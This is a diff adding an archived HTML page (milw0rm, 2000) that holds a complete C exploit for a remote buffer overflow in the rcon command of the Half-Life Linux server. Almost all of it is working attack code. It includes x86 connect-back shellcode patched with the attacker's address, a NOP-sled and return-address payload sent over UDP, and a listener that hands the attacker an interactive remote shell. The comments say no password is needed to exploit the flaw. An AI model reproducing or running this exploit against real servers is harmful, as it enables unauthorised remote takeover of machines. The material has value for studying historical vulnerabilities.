@@ -1,0 +1,390 @@
+<html><head><title>Half Life (rcon) Remote Buffer Overflow Exploit</title></head><pre>/*
+ *  SDI HalfLife rcon remote exploit for linux x86
+ *  (portuguese) exploit remoto para o buffer overflow do rcon no halflife
+ *  
+ *  Tamandua Sekure Labs (Sao Paulo - Porto Alegre, Brazil)
+ *  by Thiago Zaninotti (c0nd0r) &lt;condor@sekure.org&gt;
+ *     Gustavo Scotti   (csh)    &lt;csh@sekure.org&gt;
+ *  
+ *  Proof of concept - There is a remote exploitable buffer overflow
+ *  in Half Life server (3.1.0.x) for linux (HLDS). The problem is 
+ *  related to the RCON command (Remote CONsole).
+ *  (port.) Existe um buffer overflow exploitavel no Half Life Server
+ *  (HLDS) relacionado ao comando RCON.
+ *  
+ *  After several tests, we found out the 'rcon' command is also vulnerable
+ *  to a format string attack which can also lead to a remote exploit.
+ *  (port) O comando RCON tambem e' vulneravel a um format string attack.
+ *  
+ *  YOU DO NOT NEED THE RCON PASSWORD TO EXPLOIT THIS VULNERABILITY, 
+ *  which means any multiplayer server is vulnerable to the attack.
+ *  (port) Voce nao precisa de password para explorar esta vulnerabilidade,
+ *    o que significa que qualquer servidor e' vulneravel.
+ *  
+ *  Agradecimentos: Tamandua Sekure Labs, Fabio Ramos (framos@axur.org), 
+ *  Eduardo Freitas, Marcos Sposito, Roberto Monteiro (casper),
+ *  Nelson Britto (stderr), Sabrina Monteiro, Gabriel Zaninotti e 
+ *  Felipe Salum. A todos os leitores da Best of Security Brasil (BOS-BR).
+ *  
+ *  Respects: c_orb, el8.org (specially duke), meta, guys at core sdi, 
+ *  the &quot;infame&quot; TOXYN.ORG (pt rocks) - r00t, pr0m, horizon, plaguez, 
+ *  ratao and p.ulh.as/promisc.net crew. Greetz to AXUR.ORG too! guys at
+ *  sekure.org: vader, jamez, falcon and staff.
+ *  
+ *  also thanks to botman (botman@mailandnews.com).
+ *  Visit the brazilian security portal: http://www.securenet.com.br
+ */
+
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/time.h&gt;
+#include &lt;netdb.h&gt;
+
+typedef unsigned long	u32;
+typedef unsigned short	u16;
+typedef unsigned char	u8;
+
+unsigned char shellcode[]=
+  &quot;\xeb\x03\x5e\xeb\x1d\xe8\xf8\xff\xff\xff scotti@axur.org&quot;
+  &quot;\x2f\x62\x69\x6e\x2f&quot;
+  &quot;\x73\x68\x40\x31\xc0\x66\x40\x66\x40\x66\x89\x06\x31\xc9\xb1\x08&quot;
+  &quot;\x89\xf7\x83\xc7\x08\x30\xc0\x88\x07\x47\x49\x75\xfa\x31\xc0\x89&quot;
+  &quot;\x46\x28\x40\x89\x46\x24\x40\x89\x46\x20\x8d\x4e\x20\x31\xdb\x43&quot;
+  &quot;\x31\xc0\x83\xc0\x66\xcd\x80\x89\xc7\x89\x46\x20\x8d\x06\x89\x46&quot;
+  &quot;\x24\x31\xc0\x83\xc0\x10\x89\x46\x28\x8d\x4e\x20\x31\xdb\x43\x43&quot;
+  &quot;\x43\x31\xc0\x83\xc0\x66\x57\xcd\x80\x5f\x31\xc0\x83\xc0\x3f\x89&quot;
+  &quot;\xfb\x31\xc9\xcd\x80\x31\xc0\x83\xc0\x3f\x31\xdb\x31\xc9\x41\xcd&quot;
+  &quot;\x80\x31\xc0\x83\xc0\x3f\x31\xdb\x31\xc9\x41\x41\xcd\x80\x89\xf0&quot;
+  &quot;\x83\xc0\x18\x89\x46\x18\x31\xc0\x88\x46\x17\x89\x46\x1c\xb0\x0b&quot;
+  &quot;\x8d\x4e\x18\x8d\x56\x1c\x89\xf3\x83\xc3\x10\xcd\x80\x31\xc0\x40&quot;
+  &quot;\xcd\x80&quot;;
+
+/* NET functions */
+int
+udp_read( int sock, u32 *daddr, u16 *port, void *ptr, u16 ptr_size)
+{
+        struct sockaddr_in server;
+        int i,n;
+        i = sizeof(server);
+        n=recvfrom( sock, ptr, ptr_size, 0, (struct sockaddr *)&amp;server, &amp;i);
+        *daddr = ntohl(server.sin_addr.s_addr);
+        *port = ntohs(server.sin_port);
+        return n;
+}
+
+int
+udp_send( int sock, u32 daddr, u16 port, void *ptr, u16 ptr_size)
+{
+        struct sockaddr_in server;
+        server.sin_family = AF_INET;
+        server.sin_port = htons( port);
+        server.sin_addr.s_addr = htonl( daddr);
+        return sendto( sock, ptr, ptr_size, 0, (struct sockaddr *)&amp;server, sizeof(server));
+}
+
+int
+udp_connect( u32 addr, u16 port)
+{
+        struct sockaddr_in client;
+        int new_fd;
+
+        new_fd = socket( AF_INET, SOCK_DGRAM, 0);
+        if (new_fd&lt;0)
+           return new_fd;
+
+        bzero( (char *) &amp;client, sizeof( client));
+        client.sin_family = AF_INET;
+        client.sin_addr.s_addr = htonl( addr);
+        client.sin_port = htons( port);
+        if (connect( new_fd, (struct sockaddr *)&amp;client, sizeof(client))&lt;0)
+           return -1; /* cant bind local address */
+
+        return new_fd;
+}
+
+u32 dns2ip( u8 *host)
+{
+        struct hostent *dns;
+        u32     saddr;
+        dns = gethostbyname( host);
+        if (!dns)
+           return 0xffffffff;
+        bcopy( (char *)dns-&gt;h_addr, (char *)&amp;saddr, dns-&gt;h_length);
+        return ntohl(saddr);
+}
+
+int
+async_read( int sock_r, int rettime)
+{
+   fd_set           fd_r;
+   struct timeval   tv;
+   char             try_ch[4]=&quot;/-\\|&quot;;
+
+   int r,j;
+
+   for (r=0;r&lt;rettime;r++)
+       {
+       for (j=0;j&lt;20;)
+           {
+           int i;
+
+           printf(&quot;\b%c&quot;, try_ch[(j%4)]);
+           fflush(stdout);
+
+           FD_ZERO( &amp;fd_r);
+           FD_SET( sock_r, &amp;fd_r);
+
+	   tv.tv_sec  = 0;
+	   tv.tv_usec = 50000;
+           
+	   i =select( sock_r + 1, &amp;fd_r, NULL, NULL, &amp;tv);
+           if (!i) { j++; continue; }
+           if (i&gt;0)
+	      if (FD_ISSET(sock_r, &amp;fd_r)) return sock_r;
+           else
+              return -1;
+           }
+       }
+   return -1;
+}
+
+int
+get_server_info( int sock, u32 addr, u16 port)
+{
+   u32 r_addr;
+   u16 r_port;
+   int n, i;
+   u8  pkt[256], *str;
+
+   pkt[0] = pkt[1] = pkt[2] = pkt[3] = 0xff;
+   sprintf(&amp;pkt[4], &quot;details&quot;);
+
+   n = udp_send(sock, addr, port, pkt, strlen(pkt));
+   printf(&quot;.  connecting to the server...  &quot;); fflush(stdout);
+   if (async_read(sock, 6)&lt;0)
+       goto server_down;
+   n = udp_read(sock, &amp;addr, &amp;port, pkt, sizeof(pkt));
+   if (n&lt;0)
+	{
+server_down:
+	printf(&quot;\bserver down!\r*\n&quot;);
+	exit(0);
+	}
+   printf(&quot;\bdone\n&quot;);
+   str = &amp;pkt[4]; 
+   str+=strlen(str)+1;
+   printf(&quot;\t server_name  [%s]\n&quot;, str); str+=strlen(str)+1;
+   printf(&quot;\t    map_name  [%s]\n&quot;, str); str+=strlen(str)+1;
+   str+=strlen(str)+1;
+
+   printf(&quot;\t   game_name  [%s]\n&quot;, str); str+=strlen(str)+1;
+   printf(&quot;\tusers_online  [%d of %d]\n&quot;, str[0], str[1]); str+=3;
+   printf(&quot;\t   remote_OS  [%s]\n&quot;, (str[1]=='w' ? &quot;windows&quot; : (str[1]=='l' ? &quot;linux&quot; : &quot;unknown&quot;)));
+   if (str[1]=='w') return 2;
+   if (str[1]=='l') return 1;
+   return 0;
+}
+
+u32 retrieve_local_info(int sock, u8 *host)
+{
+   struct sockaddr_in server;
+   int    soclen;
+   soclen = sizeof(server);
+   if (getsockname(sock, (struct sockaddr *)&amp;server, &amp;soclen)&lt;0)
+       {
+       printf(&quot;error in getsockname\n&quot;);
+       exit(0);
+       }
+   snprintf(host, 256, &quot;%s:%d&quot;, inet_ntoa(server.sin_addr), htons(server.sin_port));
+   return htonl(server.sin_addr.s_addr);
+}
+
+int 
+bind_tcp( int *port)
+{
+   struct sockaddr_in mask_addr;
+   int sock, portno=25000; /* base_port */
+
+   sock = socket( AF_INET, SOCK_STREAM, 0);
+   if (sock&lt;0)
+      return sock;
+
+redo:
+   mask_addr.sin_family = AF_INET;
+   mask_addr.sin_port = htons( portno);
+   mask_addr.sin_addr.s_addr = 0;
+
+   if (bind(sock, (struct sockaddr *)&amp;mask_addr, sizeof(mask_addr))&lt;0)
+      {
+error:
+      portno++;
+      if (portno&gt;26000)
+         {
+         printf(&quot;*  no TCP port to bind in.\n&quot;);
+         exit(0);
+         }
+      goto redo;
+      }
+   if (listen( sock, 0)&lt;0)
+      goto error;
+
+   printf(&quot;.  TCP listen port number %d\n&quot;, portno);
+   *port = portno;
+   return sock;
+}
+
+wait_for_connect(int sock)
+{
+   fd_set fds;
+   u8     tmp[256];
+   int    tcp, addr_len;
+   struct sockaddr_in server;
+
+   printf(&quot;.  waiting for connect_back shellcode responde...  &quot;);
+   if (async_read(sock, 15)!=sock)
+	{
+  	printf(&quot;\bfailed!\r*\n&quot;);
+        exit(0);
+        }
+    tcp = accept( sock, (struct sockaddr *)&amp;server, &amp;addr_len);
+    printf(&quot;\bconnected\n.       ^---&gt; from %s:%d\n&quot;, inet_ntoa(server.sin_addr), ntohs(server.sin_port));
+    close(sock); /* closing incoming socket */
+    printf(&quot;.  congratulations. you have owned this one.\n&quot;);
+
+    
+    /* basic async mode */
+    while (1)
+        {
+        FD_ZERO(&amp;fds);
+        FD_SET(0, &amp;fds);
+        FD_SET(tcp, &amp;fds);
+       
+        if (select(tcp+1, &amp;fds, NULL, NULL, NULL)&gt;0)
+           {
+           if (FD_ISSET(0, &amp;fds))
+              {
+              int n;
+              n = read(0, tmp, 256);
+              if (n&lt;0)
+                 goto end_conn;
+              if (write(tcp, tmp, n)!=n) goto end_conn;
+              }
+           if (FD_ISSET(tcp, &amp;fds))
+              {
+              int n;
+              n = read(tcp, tmp, 256);
+              if (n&lt;0)
+                 goto end_conn;
+
+              if (write(0, tmp, n)!=n) goto end_conn;
+              }
+	   }
+	}
+end_conn:
+    close(tcp);
+    printf(&quot;.  bye-bye. Stay tuned for more Tamandua Sekure Labs codes.\n&quot;);  
+}
+
+assembly_shell_code(int sock, u32 addr, u16 port, u32 laddr, u8 *linfo)
+{
+   u8    pkt[2048], 
+         *shell_ptr;
+   struct sockaddr_in *sc_server;
+   u32   ret_addr = 0xbfffb1f4, last_byte = 1014, over_head = 40;
+   int   i, n, tcp, tcp_port;
+
+   printf(&quot;.  localinfo %s\n&quot;, linfo);
+   tcp = bind_tcp( &amp;tcp_port);
+   sc_server = (struct sockaddr_in *)&amp;shellcode[10];
+   sc_server-&gt;sin_addr.s_addr = htonl(laddr);
+   sc_server-&gt;sin_port = htons(tcp_port);
+
+   last_byte-=strlen(linfo);
+   pkt[0] = pkt[1] = pkt[2] = pkt[3] = 0xff;
+   sprintf( &amp;pkt[4], &quot;rcon &quot;);
+   i = strlen(pkt);
+   shell_ptr = &amp;pkt[i];
+
+   /* find out how many nops we can push before shellcode */
+   n = last_byte - i - sizeof(shellcode)-1 - over_head;
+   for (i=0;i&lt;n;i++)
+       shell_ptr[i] = 0x90; /* nop */
+   shell_ptr+=i;
+
+   /* fill in the shellcode */
+   for (i=0;i&lt;sizeof(shellcode)-1;i++)
+       shell_ptr[i] = shellcode[i];
+   shell_ptr+=i;
+
+   /* fill in the overhead buffer */
+   for (i=0;i&lt;over_head;i++)
+       shell_ptr[i] = '-';
+   shell_ptr+=i;
+
+   /* fill return address and ebp */
+   *(u32 *)shell_ptr = ret_addr; shell_ptr+=4;
+   *(u32 *)shell_ptr = ret_addr; shell_ptr+=4;
+
+   /* finalize string */
+   *shell_ptr = 0;
+
+   n = udp_send( sock, addr, port, pkt, strlen(pkt));
+   printf(&quot;.  sending poison code. %d bytes sent\n&quot;,n);
+   wait_for_connect(tcp);
+}
+
+usage()
+{
+   printf(&quot;\n.  usage: hl-rcon &lt;server ip[:port]&gt;\n&quot;);
+   exit(-1);
+}
+
+main(int argc, char **argv)
+{
+   u32 addr, laddr;
+   u16 port;
+
+   int sock, i;
+   u8  linfo[256], *tmp = NULL;
+
+   printf(&quot;.  half-life 3.1.0.x remote buffer-overflow for linux x86\n&quot;);
+   printf(&quot;.  (c)2000, Tamandua Sekure Laboratories\n&quot;);
+   printf(&quot;.  Authors: Thiago Zaninotti &amp; Gustavo Scotti\n&quot;);
+
+   if (argc&lt;2)
+      usage();
+
+   tmp = (u8 *)strchr(argv[1], ':');
+   if (tmp)
+      {
+      *tmp = 0; tmp++;
+      port = atoi(tmp);
+      }
+   else
+      {
+      printf(&quot;:  port not found, using default 27015\n&quot;);
+      port = 27015;
+      }
+
+   addr = dns2ip(argv[1]);
+
+   if (addr==0xffffffff)
+      {
+      printf(&quot;host not found!\n&quot;);
+      exit(0);
+      }
+
+   sock = udp_connect( addr, port);
+   laddr = retrieve_local_info(sock, linfo);
+   if (get_server_info(sock, addr, port)!=1)
+      {
+      printf(&quot;this is not a linux server. Make a shellcode to it and have fun\n&quot;);
+      exit(0);
+      }
+   assembly_shell_code(sock, addr, port, laddr, linfo); 
+   
+}
+
+// milw0rm.com [2000-11-16]</pre></html>
